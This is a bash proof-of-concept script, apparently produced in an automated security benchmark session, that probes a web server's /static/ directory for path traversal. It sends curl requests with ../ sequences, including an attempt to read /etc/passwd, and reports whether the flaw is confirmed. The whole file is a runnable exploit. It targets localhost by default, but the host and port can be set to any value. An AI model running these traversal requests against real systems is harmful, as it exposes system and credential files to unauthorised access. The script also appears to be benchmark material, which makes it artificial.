#!/bin/bash
# POC: Path traversal vulnerability in /static/ directory allowing access to parent directories and root web directory via ../ sequences
# Target: ./repo
# Created: 2025-11-07T18:56:56.042Z
# Session: benchmark-XBEN-060-24-mhp7ehle

# Path Traversal Vulnerability POC - /static/ Directory
# Demonstrates the ability to traverse out of /static/ and access parent directories
# Target: http://localhost:8080/static/

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-8080}"
BASE_URL="http://${TARGET_HOST}:${TARGET_PORT}"

echo "=========================================="
echo "Path Traversal Vulnerability POC"
echo "=========================================="
echo "Target: ${BASE_URL}/static/"
echo ""

# Test 1: Access parent directory via ../
echo "[*] Test 1: Accessing parent directory with /static/../"
echo "Command: curl -s '${BASE_URL}/static/../'"
RESPONSE1=$(curl -s "${BASE_URL}/static/../")
echo "Response Status: $(curl -s -o /dev/null -w '%{http_code}' "${BASE_URL}/static/../")"
echo "Response Preview:"
echo "$RESPONSE1" | head -20
echo ""

# Check if we can see root directory listing
if echo "$RESPONSE1" | grep -q "Directory listing\|<h1>\|<title>"; then
    echo "[+] SUCCESS: Parent directory accessible via path traversal"
    echo ""
fi

# Test 2: Deeper traversal attempt
echo "[*] Test 2: Attempting deeper traversal with /static/../../"
echo "Command: curl -s '${BASE_URL}/static/../../'"
RESPONSE2=$(curl -s "${BASE_URL}/static/../../")
echo "Response Status: $(curl -s -o /dev/null -w '%{http_code}' "${BASE_URL}/static/../../")"
echo "Response Preview:"
echo "$RESPONSE2" | head -20
echo ""

# Test 3: Traversal up and then back down
echo "[*] Test 3: Traversal pattern /static/../static/ (up then back down)"
echo "Command: curl -s '${BASE_URL}/static/../static/'"
RESPONSE3=$(curl -s "${BASE_URL}/static/../static/")
echo "Response Status: $(curl -s -o /dev/null -w '%{http_code}' "${BASE_URL}/static/../static/")"
echo "Response Preview:"
echo "$RESPONSE3" | head -20
echo ""

# Test 4: Check for specific file access patterns
echo "[*] Test 4: Checking for file access via path traversal patterns"
echo "Command: curl -s '${BASE_URL}/static/../../../etc/passwd'"
RESPONSE4=$(curl -s "${BASE_URL}/static/../../../etc/passwd" 2>/dev/null)
RESPONSE4_STATUS=$(curl -s -o /dev/null -w '%{http_code}' "${BASE_URL}/static/../../../etc/passwd")
echo "Response Status: ${RESPONSE4_STATUS}"
if [ "${RESPONSE4_STATUS}" != "404" ]; then
    echo "Response Preview:"
    echo "$RESPONSE4" | head -10
fi
echo ""

# Summary
echo "=========================================="
echo "POC Summary:"
echo "=========================================="
STATUS1=$(curl -s -o /dev/null -w '%{http_code}' "${BASE_URL}/static/../")
STATUS2=$(curl -s -o /dev/null -w '%{http_code}' "${BASE_URL}/static/../../")
STATUS3=$(curl -s -o /dev/null -w '%{http_code}' "${BASE_URL}/static/../static/")

if [ "$STATUS1" = "200" ] || [ "$STATUS2" = "200" ] || [ "$STATUS3" = "200" ]; then
    echo "[+] Path traversal vulnerability CONFIRMED"
    echo "    - /static/../ returned: $STATUS1"
    echo "    - /static/../../ returned: $STATUS2"
    echo "    - /static/../static/ returned: $STATUS3"
    echo ""
    echo "[+] IMPACT: Attacker can bypass /static/ directory restrictions"
    echo "    and access files in parent directories and web root."
else
    echo "[-] Path traversal not detected"
fi